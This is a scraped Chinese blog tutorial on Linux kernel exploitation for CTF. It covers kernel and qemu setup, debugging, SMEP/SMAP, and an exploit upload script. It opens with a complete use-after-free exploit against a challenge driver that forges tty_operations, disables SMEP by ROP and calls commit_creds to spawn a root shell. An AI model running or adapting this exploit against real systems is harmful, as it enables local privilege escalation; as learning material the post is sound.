28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 #include #include #include #include #include #include #include #include struct trap_frame { uint64_t rip; uint64_t cs; uint64_t rflag; uint64_t rsp; uint64_t ss; }; struct trap_frame tf; struct tty_operations { struct tty_struct *(*lookup) (struct tty_driver * driver, struct file * filp, int idx); int (*install)(struct tty_driver * driver, struct tty_struct * tty); void (*remove)(struct tty_driver * driver, struct tty_struct * tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct * tty); void (*cleanup)(struct tty_struct * tty); int (*write)(struct tty_struct * tty, const unsigned char *buf, int count); int (*put_char)(struct tty_struct * tty, unsigned char ch); void (*flush_chars)(struct tty_struct * tty); int (*write_room)(struct tty_struct * tty); int (*chars_in_buffer)(struct tty_struct * tty); int (*ioctl)(struct tty_struct * tty, unsigned int cmd, unsigned long arg); long (*compat_ioctl)(struct tty_struct * tty, unsigned int cmd, unsigned long arg); void (*set_termios)(struct tty_struct * tty, struct ktermios * old); void (*throttle)(struct tty_struct * tty); void (*unthrottle)(struct tty_struct * tty); void (*stop)(struct tty_struct * tty); void (*start)(struct tty_struct * tty); void (*hangup)(struct tty_struct * tty); int (*break_ctl)(struct tty_struct * tty, int state); void (*flush_buffer)(struct tty_struct * tty); void (*set_ldisc)(struct tty_struct * tty); void (*wait_until_sent)(struct tty_struct * tty, int timeout); void (*send_xchar)(struct tty_struct * tty, char ch); int (*tiocmget)(struct tty_struct * tty); int (*tiocmset)(struct tty_struct * tty, unsigned int set, unsigned int clear); int (*resize)(struct tty_struct * tty, struct winsize * ws); int (*set_termiox)(struct tty_struct * tty, struct termiox * tnew); int (*get_icount)(struct tty_struct * tty, struct serial_icounter_struct * icount); const struct file_operations *proc_fops; }; #define KERNCALL __attribute__((regparm(3))) void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff810a1810; int (*commit_creds)(void *) KERNCALL = (void *)0xffffffff810a1420; uint64_t xchgeaxesp = 0xffffffff810e81e8; // 0xffffffff810e81e8 : xchg eax, esp ; ret void save_status() { asm( \"mov %cs, tf+8;\" \"pushfq; popq tf+16;\" \"mov %rsp, tf+24;\" \"mov %ss, tf+32;\" ); // puts(\"status saved!\"); } void get_shell() { system(\"/bin/sh\"); } int get_root() { commit_creds(prepare_kernel_cred(NULL)); return 0; } int main() { save_status(); uint64_t rop[30] = { 0xffffffff810d238d, // pop rdi ; ret 0x6f0, 0xffffffff81004d80, // mov cr4, rdi ; pop rbp ; ret 0, get_root, 0xffffffff81063694, // swapgs ; pop rbp ; ret 0, 0xffffffff814ee0a4, // opcode: 48 cf iretq }; tf.rip = get_shell; *(struct trap_frame*)(\u0026rop[8]) = tf; uint64_t base = xchgeaxesp \u0026 0xfffff000; mmap(base, 0x3000, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); memcpy(xchgeaxesp\u00260xffffffff, rop, sizeof(rop)); struct tty_operations tty_ops = {0}; tty_ops.ioctl = xchgeaxesp; uint64_t fake_tty[4] = {0}; int fd1 = open(\"/dev/babydev\", O_RDWR); int fd2 = open(\"/dev/babydev\", O_RDWR); ioctl(fd1, 0x10001, 0x2e0); close(fd1); int fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY); read(fd2, fake_tty, 32); fake_tty[3] = \u0026tty_ops; write(fd2, fake_tty, 32); ioctl(fd_tty, 0, 0); return 0; } ERROR musl-gcc 编译 32bit出错 ROPgadget 计算jmp relative地址错误 1 2 3 4 5 6 7 pwndbg\u003e x/4i 0xffffffff8181bfc5 0xffffffff8181bfc5:\tmov rsp,rax 0xffffffff8181bfc8:\tdec ebx 0xffffffff8181bfca:\tjmp 0xffffffff8181bf7e 0xffffffff8181bfcc:\tnop DWORD PTR [rax+0x0] pwndbg\u003e x/hx 0xffffffff8181bfca 0xffffffff8181bfca:\t0xb2eb ROPgadget所显示的gadget为0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf83。\n从pwndbg得到opcodeebb2，是jmp rel8类型ref，八位相对地址跳转b2最高位为1，是负数-0x4e，也就是向低地址跳转，0xffffffff8181bfcc-0x4e = 0xffffffff8181bf7e。\n2020-10-30更新\n编译加载简单module 为了方便地获得struct cred和struct tty_struct的大小，编译简单的module。\n1. 编译内核 这里随便用了个版本，实际上应该获取题目内核版本，下载其源码编译。Compile Kernel\n2. 编译busybox 在官网下载源码。\n1 2 3 4 5 6 7 8 9 10 $ bzip2 -d -v busybox-1.32.0.tar.bz2 $ tar xvf busybox-1.32.0.tar $ cd busybox-1.32.0 $ make menuconfig # 进入setting，勾上Build static binary(no shared libs) $ make install -j4 # 4是编译线程数，根据情况改 $ cd _install $ mkdir proc sys $ touch init pack $ chmod +x init $ chmod +x pack 在init中写入如下(注意更改模块名称)\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/sh echo \"{==DBG==} INIT SCRIPT\" mkdir /tmp mount -t proc none /proc mount -t sysfs none /sys mount -t debugfs none /sys/kernel/debug mount -t tmpfs none /tmp # insmod /xxx.ko # load ko mdev -s # We need this to find /dev/sda later echo -e \"{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds\" setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user # exec /bin/sh #root 在pack里写入打包命令\n1 2 3 #!/bin/sh echo \"Generate rootfs.img\" find . | cpio -o --format=newc \u003e ./rootfs.cpio 3. 编写编译module 在kernel目录下新建文件夹，创建源码文件\n1 2 3 $ mkdir test_module $ cd test_module $ touch hello.c Makefile 在hello.c中写入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include #include #include #include #include MODULE_LICENSE(\"Dual BSD/GPL\"); struct cred c1; struct tty_struct t1; static int hello_init(void) { printk(\"\u003c1\u003e Hello world!\\n\"); printk(\"\u003c1\u003e sizeof cred: 0x%lx \\n\", sizeof(c1)); printk(\"\u003c1\u003e sizeof tty_struct: 0x%lx\", sizeof(t1)); return 0; } static void hello_exit(void) { printk(\"\u003c1\u003e Bye, cruel world\\n\"); } module_init(hello_init); module_exit(hello_exit); 在Makefile中写入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 obj-m := hello.o KERNELDR := /home/liu/src/kernel/linux-5.4.72 PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules modules_install: $(MAKE) -C $(KERNELDR) M-$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后make\n4. 启动系统 将hello.ko放入到busybox的_install目录下，使用pack打包。\n将生成的rootfs.cpio，bzImage放在一个文件夹下面，并新建启动脚本boot.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -kernel ./bzImage \\ -initrd ./rootfs.cpio \\ -append \"console=ttyS0 root=/dev/ram oops=panic panic=1 kalsr\" \\ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\ -monitor /dev/null \\ --nographic \\ -smp cores=2,threads=1 \\ -cpu kvm64,+smep \\ #-gdb tcp::1234 \\ #-S 执行boot.sh就可以看到输出的大小了。\nto do list 如何定位call rax/call [rax+0x38]（tty_operation)\n智熄了。。直接看call backtrace。从某个地址向前查看指令，可能会遇到指令不对齐的问题，多试几个数字，直到当前地址的指令显示正确。如地址0xffffffff814dc0c6：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pwndbg\u003e x/10i 0xffffffff814dc0c6-1 0xffffffff814dc0c5: cmp BYTE PTR [rcx+rcx*4-0x9],cl 0xffffffff814dc0c9: mov r15d,eax # 未对齐 ... pwndbg\u003e x/10i 0xffffffff814dc0c6-2 0xffffffff814dc0c4: push rax 0xffffffff814dc0c5: cmp BYTE PTR [rcx+rcx*4-0x9],cl 0xffffffff814dc0c9: mov r15d,eax # 未对齐 ... pwndbg\u003e x/10i 0xffffffff814dc0c6-3 0xffffffff814dc0c3: call QWORD PTR [rax+0x38] 0xffffffff814dc0c6: mov rdi,r14 # 对齐成功 ... struct size 计算。编译简单module ref1 ref2\n参考 How to compile and install linux kernel 5.6.9 from souce code? How to Build A Custom Linux Kernel For Qemu? Linux Kernel Pwn ABC(Ⅰ) Linux Kernel Pwn ABC(II) Kernel调试文件总结 What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage \u0026 bzimage? Kernel Pwn 学习之路(一) what’s the difference between iret and iretd,iretq? How to share files instantly between virtual machines and host Linux Pwn技巧总结_1 – V1NKe NCSTISC Linux Kernel PWN450 Writeup 内核Pwn 环境搭建 ","wordCount":"8144","inLanguage":"zh-cn","datePublished":"2020-10-25T19:12:40Z","dateModified":"2020-10-25T19:12:40Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/kernel-pwn-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Kernel Pwn: 从入门到入土</h1><div class=post-meta><span title='2020-10-25 19:12:40 +0000 UTC'>October 25, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><h2 id=misc>MISC<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2><h3 id=内核文件区别>内核文件区别<a hidden class=anchor aria-hidden=true href=#内核文件区别>#</a></h3><p><code>vmlinux</code> 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。</p><p><code>vmlinuz</code> 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Decompressing Linux... done
</span></span><span class=line><span class=cl>Booting the kernel.
</span></span></code></pre></td></tr></table></div></div><p><code>zImage</code> 是经过压缩的小内核（小于512KB）。</p><p><code>bzImage</code> 是经过压缩的大内核（大于512KB）。</p><h3 id=initial-ramdisk>Initial Ramdisk<a hidden class=anchor aria-hidden=true href=#initial-ramdisk>#</a></h3><p>名字类似<code>initramfs.cpio</code> 文件，一般可以使用cpio读取其中的文件。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find . <span class=p>|</span> cpio -o --format<span class=o>=</span>newc &gt; initramfs.cpio <span class=c1># compress</span>
</span></span><span class=line><span class=cl>$ sudo cpio -idmv &lt; initramfs.cpio <span class=c1># depress</span>
</span></span></code></pre></td></tr></table></div></div><p>有时也经过了gzip的压缩。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ mv initramfs.cpio initramfs.cpio.gz
</span></span><span class=line><span class=cl>$ gunzip initramfs.cpio.gz	<span class=c1># 解压得到initramfs.cpio</span>
</span></span><span class=line><span class=cl>$ cpio -idmv &lt; initramfs.cpio
</span></span></code></pre></td></tr></table></div></div><p>更改为正确的后缀之后，图形界面“归档管理器”也可以打开。</p><p><span id=jump1></span></p><h2 id=compile-kernel>Compile kernel<a hidden class=anchor aria-hidden=true href=#compile-kernel>#</a></h2><p>Host: Ubuntu 20.04</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.72.tar.xz <span class=c1># get link from kernel.org</span>
</span></span><span class=line><span class=cl>$ xz -d -v linux-5.4.72.tar.xz
</span></span><span class=line><span class=cl>$ tar xvf linux-5.4.72.tar
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> linux-5.4.72
</span></span><span class=line><span class=cl>$ cp -v /boot/config-<span class=k>$(</span>uname -r<span class=k>)</span> .config
</span></span><span class=line><span class=cl>$ sudo apt-get install build-essential libncurses-dev bison flex libssl-dev libelf-dev
</span></span><span class=line><span class=cl>$ make menuconfig <span class=c1># optional, 此项设置好之后除非必要，尽量不要改动，否则会完全的重新编译</span>
</span></span><span class=line><span class=cl>$ make <span class=c1># make -j $(nproc)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=qemu>Qemu<a hidden class=anchor aria-hidden=true href=#qemu>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-m 指定内存大小
</span></span><span class=line><span class=cl>-nographic 没有图形界面，同时影响串并口
</span></span><span class=line><span class=cl>-kernel 指定启动内核
</span></span><span class=line><span class=cl>-machine 选择模拟的机器 -machine help显示所有
</span></span><span class=line><span class=cl>    -accel 选择加速，有kvm、xen等等
</span></span><span class=line><span class=cl>-append 添加内核启动选项
</span></span><span class=line><span class=cl>-monitor 重定向monitor到主机设备，图形模式默认到vc，非图形模式默认到stdio
</span></span><span class=line><span class=cl>-fsdev 定义一个新的文件系统设备
</span></span><span class=line><span class=cl>    与-device virtio-9t-同用
</span></span><span class=line><span class=cl>    -device virtio-9p-type,fsdev=id,mount_tag=mount_tag
</span></span><span class=line><span class=cl>-enable-kvm 启用kvm全虚拟化支持
</span></span><span class=line><span class=cl>-initrd 将文件用作起始ram disk
</span></span><span class=line><span class=cl>-hda/b/c/d 将文件用作硬盘0/1/2/3
</span></span><span class=line><span class=cl>-snapshot 写入临时文件，而不是映像文件。（可以强制写回
</span></span></code></pre></td></tr></table></div></div><h2 id=debug>Debug<a hidden class=anchor aria-hidden=true href=#debug>#</a></h2><p>使用qemu的<code>-s</code>选项，默认将会在1234端口开启gdb server。如果 1234 号端口用不了，也可以换成 -gdb tcp::[port num]</p><p>加断点的话，CTRL+C打断 gdb，输入就行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ lsmod <span class=c1># 查看加载的模块</span>
</span></span><span class=line><span class=cl>$ cat /sys/module/basic1_ch1/sections/.text <span class=c1># 依次获取.text .bss .data加载地址</span>
</span></span><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span>$ target remote :1234 <span class=c1># 连接到本地调试端口</span>
</span></span><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span>$ add-symbol-file ./tostring.ko 0xc3827000 -s .bss 0xc3827600 -s .data 0xc3827360 <span class=c1># 在gdb中加载符号</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mitigation>Mitigation<a hidden class=anchor aria-hidden=true href=#mitigation>#</a></h2><h3 id=smep>SMEP<a hidden class=anchor aria-hidden=true href=#smep>#</a></h3><p>全称Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)。</p><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p><p><img alt=CR4 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgCR4.jpg></p><p>CR4 寄存器是可以通过 mov 指令修改的。从vmlinux中提取gadget，可以达到这个目的。</p><p>gdb无法查看CR4寄存器的值，可以通过kernel crash时的信息来查看。关闭SMEP保护，常用一个固定的值0x6f0,即<code>mov cr4, 0x6f0</code>。</p><h3 id=smap>SMAP<a hidden class=anchor aria-hidden=true href=#smap>#</a></h3><p>Superivisor Mode Access Protection，类似于 SMEP，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</p><h3 id=mmap_min_addr>MMAP_MIN_ADDR<a hidden class=anchor aria-hidden=true href=#mmap_min_addr>#</a></h3><ul><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li></ul><h2 id=upload脚本>upload脚本<a hidden class=anchor aria-hidden=true href=#upload脚本>#</a></h2><p>用于将poc或exp上传到主机。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prompt</span> <span class=o>=</span> <span class=s2>&#34;$ &#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;stty -echo&#34;</span><span class=p>)</span>    <span class=c1># 关闭回显</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;gcc -static -m32 -O2 ./</span><span class=si>{}</span><span class=s2>.c -o </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span> <span class=c1># 普通gcc编译。musl-gcc编译32bit出错</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;gzip -c </span><span class=si>{}</span><span class=s2> &gt; </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>),</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;len: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>encoded</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;len: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>encoded</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>encoded</span><span class=p>),</span> <span class=mi>1000</span><span class=p>):</span>    <span class=c1># 文件过大会出现上传不完整，后来改成1000就可以</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;echo </span><span class=se>\&#34;</span><span class=si>{}</span><span class=se>\&#34;</span><span class=s2> &gt;&gt; </span><span class=si>{}</span><span class=s2>.gz.b64&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>encoded</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>1000</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>),</span> <span class=n>name</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;base64 -d </span><span class=si>{}</span><span class=s2>.gz.b64 &gt; </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;gunzip </span><span class=si>{}</span><span class=s2>.gz&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;chmod +x </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=s2>&#34;./</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./._start_vm&#34;</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>upload</span><span class=p>(</span><span class=s2>&#34;poc&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># session = ssh(USER, HOST, PORT, PW) # ssh连接的情况</span>
</span></span><span class=line><span class=cl><span class=c1># io = session.run(&#34;/bin/sh&#34;)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=预备知识>预备知识<a hidden class=anchor aria-hidden=true href=#预备知识>#</a></h2><h3 id=loadable-kernel-moduleslkms3>Loadable Kernel Modules(LKMs)[3]<a hidden class=anchor aria-hidden=true href=#loadable-kernel-moduleslkms3>#</a></h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><p><img alt=LKM loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgLKM.jpg></p><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h4 id=相关指令>相关指令<a hidden class=anchor aria-hidden=true href=#相关指令>#</a></h4><ol><li><strong>insmod</strong>: 将指定模块加载到内核中。</li><li><strong>rmmod</strong>: 从内核中卸载指定模块。</li><li><strong>lsmod</strong>: 列出已经加载的模块。</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系。</li></ol><h4 id=file_operations结构体>file_operations结构体<a hidden class=anchor aria-hidden=true href=#file_operations结构体>#</a></h4><p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</strong></p><p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。例如：</p><table><thead><tr><th style=text-align:center>Events</th><th style=text-align:center>User functions</th><th style=text-align:center>Kernel functions</th></tr></thead><tbody><tr><td style=text-align:center>load</td><td style=text-align:center>insmod</td><td style=text-align:center>module_init()</td></tr><tr><td style=text-align:center>open</td><td style=text-align:center>fopen</td><td style=text-align:center>file_operations: open</td></tr><tr><td style=text-align:center>read</td><td style=text-align:center>fread</td><td style=text-align:center>file_operations: read</td></tr><tr><td style=text-align:center>write</td><td style=text-align:center>fwrite</td><td style=text-align:center>file_operations: write</td></tr><tr><td style=text-align:center>close</td><td style=text-align:center>fclose</td><td style=text-align:center>file_operations: release</td></tr><tr><td style=text-align:center>remove</td><td style=text-align:center>rmmod</td><td style=text-align:center>module_exit()</td></tr></tbody></table><h3 id=状态切换3>状态切换[3]<a hidden class=anchor aria-hidden=true href=#状态切换3>#</a></h3><h4 id=user-space-to-kernel-space>user space to kernel space<a hidden class=anchor aria-hidden=true href=#user-space-to-kernel-space>#</a></h4><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 